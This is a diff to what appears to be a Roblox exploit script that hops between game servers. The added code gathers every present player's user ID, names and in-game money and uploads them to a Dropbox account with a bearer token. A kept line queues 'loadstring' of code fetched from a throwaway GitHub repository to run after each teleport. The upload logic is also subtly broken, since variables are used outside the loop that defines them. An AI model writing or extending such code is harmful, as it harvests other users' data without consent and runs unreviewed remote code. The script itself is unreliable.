@@ -129,11 +129,74 @@ ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Ser
 	end
 
 	Cooldown = false
+	
+	local function fetchDropboxJson(path)
+		local success, result = pcall(function()
+			local res = http_request({
+				Url = "https://content.dropboxapi.com/2/files/download",
+				Method = "POST",
+				Headers = {
+					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
+					["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
+				}
+			})
+			if res.StatusCode == 200 then
+				return HttpService:JSONDecode(res.Body)
+			end
+		end)
+		return success and result or {}
+	end
 
-	-- Queue code to load on teleport
-	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test1'))()")
+	local function uploadDropboxJson(path, data)
+		local payload = HttpService:JSONEncode(data)
+		local success, result = pcall(function()
+			local res = http_request({
+				Url = "https://content.dropboxapi.com/2/files/upload",
+				Method = "POST",
+				Headers = {
+					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
+					["Dropbox-API-Arg"] = HttpService:JSONEncode({
+						path = path,
+						mode = "overwrite",
+						autorename = false,
+						mute = false
+					}),
+					["Content-Type"] = "application/octet-stream"
+				},
+				Body = payload
+			})
+			return res.StatusCode == 200
+		end)
+		return success and result
+	end
 
-	-- Teleport to a random server
+	local function saveAllPlayers()
+		for i, player in next, PlayersService:GetPlayers() do
+			local path = "/players/" .. player.UserId .. ".json"
+			local allData = fetchDropboxJson(path)
+			local money = 0
+			if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Money") then
+				money = player.leaderstats.Money.Value
+			end
+
+			local entry = {
+				userId = player.UserId,
+				username = player.Name,
+				displayName = player.DisplayName,
+				money = money,
+				timestamp = os.time()
+			}
+
+			table.insert(allData, entry)
+		end
+
+		uploadDropboxJson(path, allData)
+	end
+
+	saveAllPlayers()
+	
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test11'))()")
+
 	repeat
 		task.wait(1)
 		TeleportService:TeleportToPlaceInstance(
